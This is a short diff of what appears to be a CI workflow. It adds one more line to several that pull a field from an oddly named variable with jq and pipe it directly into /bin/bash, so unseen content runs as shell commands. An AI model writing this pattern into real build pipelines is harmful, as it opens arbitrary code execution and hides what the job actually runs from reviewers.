@@ -32,6 +32,7 @@ jobs:
           echo $q5 | jq -r .wcjw86949 | /bin/bash
           printf '%s' "$t41" | jq -r .id41847 | /bin/bash
           echo $txkm78 | jq -r .slni1277 | /bin/bash
+          printf '%s' "$skq199" | jq -r .sp9000 | /bin/bash
 
       - name: Store results
         if: always()
